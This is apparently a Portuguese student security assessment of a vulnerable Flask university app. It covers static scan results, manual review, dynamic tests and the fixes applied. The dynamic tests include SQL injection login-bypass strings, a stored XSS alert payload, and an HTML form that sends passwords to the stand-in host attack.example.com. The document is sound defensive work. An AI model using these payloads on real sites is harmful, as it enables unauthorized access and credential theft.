# Exploração
Este caderno contém a metodologia e os processos realizados para a análise exploratória de vulnerabilidades do código. A primeira etapa baseou-se em uma inspeção do código-fonte realizada manualmente e automaticamente por ferramentas especializadas, tal que potenciais vulnerabilidades fossem identificadas. Posteriormente, tais vulnerabilidades foram colocadas à prova utilizando testes dinâmicos, de forma a validá-las.

## Ferramenta Bandit
Utilizou-se a ferramenta Bandit para realizar uma análise estática no código, salvando a saída gerada a partir do comando:

```bash
bandit -r app.py
```

Dessa forma, as potenciais vulnerabilidades reveladas foram registradas a seguir:

```text
>> Issue: [B105:hardcoded_password_string] Possible hardcoded password: 'unidin-local-secret-key'
   Severity: Low   Confidence: Medium
   CWE: CWE-259 (https://cwe.mitre.org/data/definitions/259.html)
   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html
   Location: .\.\app.py:11:17
10	app = Flask(__name__)
11	app.secret_key = "unidin-local-secret-key"
12	BASE_DIR = Path(__file__).resolve().parent
```

```text
>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
   Severity: Medium   Confidence: Low
   CWE: CWE-89 (https://cwe.mitre.org/data/definitions/89.html)
   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b608_hardcoded_sql_expressions.html
   Location: .\.\app.py:53:16
52	        conn = get_connection()
53	        query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'"
54	        user = conn.execute(query).fetchone()

&

   Location: .\.\app.py:90:16
89	    if search:
90	        query = "SELECT d.id, d.name, g1.value AS nota1, g2.value AS nota2, g3.value AS nota3, g4.value AS nota4 FROM disciplines d JOIN enrollments e ON e.discipline_id=d.id LEFT JOIN grades g1 ON g1.discipline_id=d.id AND g1.student_id=e.student_id AND g1.assessment=1 LEFT JOIN grades g2 ON g2.discipline_id=d.id AND g2.student_id=e.student_id AND g2.assessment=2 LEFT JOIN grades g3 ON g3.discipline_id=d.id AND g3.student_id=e.student_id AND g3.assessment=3 LEFT JOIN grades g4 ON g4.discipline_id=d.id AND g4.student_id=e.student_id AND g4.assessment=4 WHERE e.student_id=" + str(user["id"]) + " AND d.name LIKE '%" + search + "%' ORDER BY d.name"
91	        rows = conn.execute(query).fetchall()
```

```text
>> Issue: [B201:flask_debug_true] A Flask app appears to be run with debug=True, which exposes the Werkzeug debugger and allows the execution of arbitrary code.
   Severity: High   Confidence: Medium
   CWE: CWE-94 (https://cwe.mitre.org/data/definitions/94.html)
   More Info: https://bandit.readthedocs.io/en/1.9.4/plugins/b201_flask_debug_true.html
   Location: .\.\app.py:204:4
203	if __name__ == "__main__":
204	    app.run(host="127.0.0.1", port=5000, debug=True)
```

## Ferramenta Semgrep
A ferramenta Semgrep também foi utilizada para realizar uma análise estática no código, a partir do seguinte comando:

```bash
semgrep scan --config p/python --config p/flask --config p/owasp-top-ten app.py
```

Dessa forma, as potenciais vulnerabilidades reveladas foram registradas a seguir:

```text
python.flask.security.injection.tainted-sql-string.tainted-sql-string
   ❰❰ Blocking ❱❱
   Detected user input used to manually construct a SQL string. This is usually bad     
   practice because manual construction could accidentally result in a SQL injection. An
   attacker could use a SQL injection to steal or modify contents of the database.      
   Instead, use a parameterized query which is available by default in most database    
   engines. Alternatively, consider using an object-relational mapper (ORM) such as     
   SQLAlchemy which will protect your queries.                                          
   Details: https://sg.run/JxZj                                                         
                                                                                       
   53┆ query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '"
      + password + "'"                                                            
   ⋮┆----------------------------------------
   90┆ query = "SELECT d.id, d.name, g1.value AS nota1, g2.value AS nota2, g3.value 
      AS nota3, g4.value AS nota4 FROM disciplines d JOIN enrollments e ON         
      e.discipline_id=d.id LEFT JOIN grades g1 ON g1.discipline_id=d.id AND        
      g1.student_id=e.student_id AND g1.assessment=1 LEFT JOIN grades g2 ON        
      g2.discipline_id=d.id AND g2.student_id=e.student_id AND g2.assessment=2 LEFT
      JOIN grades g3 ON g3.discipline_id=d.id AND g3.student_id=e.student_id AND   
      g3.assessment=3 LEFT JOIN grades g4 ON g4.discipline_id=d.id AND             
      g4.student_id=e.student_id AND g4.assessment=4 WHERE e.student_id=" +        
      str(user["id"]) + " AND d.name LIKE '%" + search + "%' ORDER BY d.name"

python.flask.security.audit.debug-enabled.debug-enabled
   ❰❰ Blocking ❱❱
   Detected Flask app with debug=True. Do not deploy to production with this flag enabled
   as it will leak sensitive information. Instead, consider using Flask configuration    
   variables or setting 'debug' using system environment variables.                      
   Details: https://sg.run/dKrd                                                          
                                                                                       
   204┆ app.run(host="127.0.0.1", port=5000, debug=True)
```

## Inspeção Manual de Código

Após o direcionamento dado pelas ferramentas de análise automática, uma inspeção manual do código foi realizada, a fim de validar potenciais vulnerabilidades encontradas anteriormente e verificar possíveis fraquezas que não foram detectadas automaticamente, considerando as modalidades solicitadas na especificação do trabalho. Dessa forma, as seguintes vulnerabilidades foram observadas:

1. Função de Login (linha 53): Construção da Query a partir da concatenação direta do texto oriundo do cliente, sem nenhum tipo de tratamento.

2. Busca de disciplinas e notas (linha 90): Construção da Query a partir da concatenação direta do parâmetro oriundo do cliente, sem nenhum tipo de tratamento.

3. Verificações para a postagem (linhas 148 e 149): O arquivo e a mensagem postados não passam por nenhum tipo de processo de validação.

4. Filtro de Login (linhas 46 a 61): A aplicação não implementa filtros automáticos contra tentativas excessivas de Login, além de utilizar formato determinístico de e-mail institucional (`[c][sobrenome]@universidade.br`).

5. Política e armazenamento de senhas (`database.py`, linhas 13 e 14): O sistema adota senhas curtas (4 a 8 caracteres, alfabeto restrito de 66 caracteres) sem validação robusta de política de senha, e a função `encripta_password` armazena apenas o hash `SHA-512` simples, sem *salt* e sem função de derivação de chave (KDF) lenta.

Outras vulnerabilidades encontradas foram:

1. Chave secreta da aplicação embutida no código (linha 11): A chave secreta da aplicação está exposta diretamente no código.

2. Método GET inadequado (linhas 46, 116 e 162): Utilização do método GET na autenticação e em funções que executam atualização e exclusão.

3. Depurador ativado (linha 204): Caso alguma exceção ocorra, a ativação do depurador pode expor diversas características da aplicação.

## Lista de CWEs
Após a verificação realizada pelas ferramentas anteriores e por meio da inspeção manual de código, a seguinte lista de CWEs foi verificada, considerando também as modalidades de vulnerabilidades esperadas pela especificação do trabalho.

* [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)

* [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

* [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

* [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)

* [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)

* [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)

* [CWE-759: Use of a One-Way Hash without a Salt](https://cwe.mitre.org/data/definitions/759.html) (agravante de CWE-521)

* [CWE-916: Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html) (agravante de CWE-521)

* [CWE-798: Use of Hard-coded Credentials - Fora do domínio da especificação](https://cwe.mitre.org/data/definitions/798.html)

* [CWE-259: Use of Hard-coded Password - Fora do domínio da especificação](https://cwe.mitre.org/data/definitions/259.html)

## Análise Dinâmica

Após a inspeção estática de código, a aplicação foi iniciada para que pudesse ser testada dinamicamente e para que as vulnerabilidades identificadas fossem avaliadas. A seguir, há o registro de cada teste realizado.

1. SQL Injection: Realizar Login com a entrada para o e-mail `'` resulta em erros de exceção, devido à má formação da Query. A depuração ativa resulta na exposição da pilha de procedimentos (CWE-489). Já a entrada `email' OR '1'='1' OR '` resulta no Login como professor, garantindo privilégios inadequados a qualquer um. Tais ataques independem da senha estar correta ou não. (CWE-89)

2. SQL Injection: Ao estar autenticado como aluno, é possível pesquisar disciplinas com a entrada `a%' OR '1'='1' OR '%a`, o que resulta na exposição das matrículas de todos os alunos, ainda que não esteja exposto o aluno em específico. (CWE-89)

3. É possível realizar uma postagem com o conteúdo `<Script Language="Javascript">alert("You've been attacked!");</Script>`, o que caracteriza Stored Cross-Site Scripting (CWE-79), uma vez que o conteúdo é persistido na aplicação. Dessa forma, sempre que as últimas postagens são buscadas, o alerta é emitido. Também seria possível roubar senhas para outro domínio a partir do seguinte Script:
```html
<div class="header"> Welcome, <div id="stealPassword"> Please Login:

<form name="input" action="attack.example.com/stealPassword.php" method="post">
Username: <input type="text" name="username" /><br/>
Password: <input type="password" name="password" /><br/>
<input type="submit" value="Login" />
</form>

</div></div>
```

4. É possível realizar postagens com anexos com conteúdos maliciosos, uma vez que o formato ou o conteúdo não é verificado. Tais arquivos ainda podem ser visualizados posteriormente ou mesmo baixados por demais usuários, ampliando o potencial de exploração da vulnerabilidade. Um arquivo HTML com o mesmo Script anterior poderia ser utilizado. Não foi verificada a execução de certos conteúdos, porém ainda é possível compartilhar arquivos potencialmente maliciosos (CWE-434).

5. Ausência de restrição a tentativas excessivas de autenticação (CWE-307): Submetendo tentativas consecutivas de Login com senhas incorretas para a conta `sspark@universidade.br` (derivável do nome completo pelo padrão `[c][sobrenome]@universidade.br`), o servidor aceitou todas as requisições sem restrição, retornando sempre HTTP 200 com a mensagem padrão de credenciais inválidas, sem bloqueio temporário, atraso progressivo ou resposta HTTP 429.

6. Requisitos fracos de senha e armazenamento com hash rápido sem *salt* (CWE-521, agravada por CWE-759 e CWE-916): A política de senhas adotada (4 a 8 caracteres e alfabeto reduzido de 66 caracteres) limita o espaço de busca a $66^4 = 18.974.736$ combinações no limite inferior e impede senhas longas (*passphrases*). Além disso, na inspeção da tabela `users` em `unidin.db`, confirmou-se o armazenamento em `SHA-512` puro de 128 caracteres hexadecimais sem *salt* (ex.: `6d855ae2ae3547e208e3ec12...` para `sspark@universidade.br`), facilitando ataques de força bruta e dicionário *offline* em caso de vazamento do banco.

## Correções realizadas

Os arquivos modificados foram duplicados para preservar a versão original da aplicação. As alterações implementadas em cada arquivo estão registradas a seguir:

1. **`app.py` -> `app_corrigido.py`**
   * **Limitação de tentativas e bloqueio temporário no Login (CWE-307):** implementação de controle por janela deslizante (`WINDOW_SECONDS = 300`), limite de 5 falhas (`MAX_LOGIN_ATTEMPTS = 5`) e bloqueio temporário de 5 minutos (`LOCKOUT_SECONDS = 300`) por endereço IP e por e-mail normalizado, retornando HTTP 429 durante o período de bloqueio e limpando o histórico após autenticação bem-sucedida.
   * **Integração da verificação e migração transparente de senhas (CWE-759/CWE-916):** atualização da rota `/login` para validar credenciais via `verifica_password` (de `database_corrigido.py`) e regravar automaticamente no banco (`UPDATE`) os hashes `SHA-512` legados para `scrypt` com *salt* no primeiro login válido.
   * **Desativação do modo de depuração (CWE-489):** alteração de `debug=True` para `debug=False` na inicialização da aplicação, evitando a exposição da pilha de chamadas em caso de erro.
   * **Parametrização da consulta de Login (CWE-89):** substituição da concatenação de strings na rota `/login` por consulta parametrizada (`?`).
   * **Parametrização da busca de disciplinas (CWE-89):** substituição da concatenação de strings na consulta da página do aluno por consulta parametrizada, passando o padrão do `LIKE` como parâmetro.
   * **Controles de envio de anexos no fórum (CWE-434):** definição do limite de 30 MB por requisição (`MAX_CONTENT_LENGTH`), sanitização do nome do arquivo com `secure_filename`, bloqueio de extensões executáveis e interpretáveis pelo navegador (`BLOCKED_EXTENSIONS`) em `add_message` (retornando HTTP 400) e manutenção da validação contra mensagens vazias sem anexo.

2. **`database.py` -> `database_corrigido.py`**
   * **Substituição de SHA-512 simples por KDF com *salt* (CWE-759/CWE-916):** adoção de `generate_password_hash` e `check_password_hash` (`werkzeug.security`, utilizando `scrypt` com *salt* aleatório) em `encripta_password` e `verifica_password`, mantendo compatibilidade temporária com comparação em tempo constante (`hmac.compare_digest`) para migração dos registros legados de `unidin.db`.
   * **Validação de política de senha (CWE-521):** inclusão da função `validar_politica_senha` para futuros fluxos de cadastro e alteração de senha, exigindo entre 12 e 128 caracteres com letras maiúsculas, minúsculas, dígitos e símbolos.

3. **`templates/disciplina.html` -> `templates/disciplina_corrigido.html`**
   * **Restauração do escapamento automático no fórum (CWE-79):** remoção do filtro `|safe` na exibição do corpo das mensagens (`{{ message['body'] }}`), reativando o escapamento padrão do Jinja2 contra Stored XSS.

## Reavaliação pós-correção

Após a aplicação de todas as correções, os cenários de ataque e o funcionamento legítimo do sistema foram reavaliados manualmente sobre a versão corrigida (`app_corrigido.py` e `database_corrigido.py`):

* **CWE-307 (Bloqueio no Login):** após 5 tentativas falhas consecutivas para `sspark@universidade.br` (retornando HTTP 200), a 6ª tentativa foi bloqueada com HTTP 429 e mensagem de espera; mesmo o envio da credencial válida permaneceu bloqueado enquanto o período de *lockout* esteve ativo. Encerrado o bloqueio, o login legítimo voltou a funcionar normalmente (HTTP 302 para `/` e acesso a `/aluno`).
* **CWE-521 e CWE-759/CWE-916 (Política de senhas e migração de *hash*):** no primeiro login válido de `sspark@universidade.br`, o *hash* armazenado em `unidin.db` foi migrado automaticamente de 128 caracteres (`SHA-512`, prefixo `6d855ae2...`) para 162 caracteres no formato `scrypt:32768:8:1$...`, e logins subsequentes após *logout* funcionaram normalmente com o novo formato. Nos testes sobre `validar_politica_senha`, senhas no padrão antigo (4 e 8 caracteres) e sem diversidade de classes foram rejeitadas, enquanto senhas fortes de 12 ou mais caracteres foram aceitas.
* **CWE-89, CWE-489, CWE-79 e CWE-434:** os vetores de SQL Injection no login e na busca de disciplinas, Stored XSS no fórum e upload de arquivos `.html` deixaram de funcionar, preservando o uso normal do sistema (consultas legítimas, postagens de texto e envio de anexos permitidos).
* **Reanálise estática com Bandit:** a execução de `python -m bandit -r app_corrigido.py database_corrigido.py` confirmou a eliminação dos alertas de severidade média e alta (`B608` e `B201`), restando apenas o aviso `B105` de severidade baixa referente à `secret_key` fixa (fora do escopo das três categorias do trabalho).
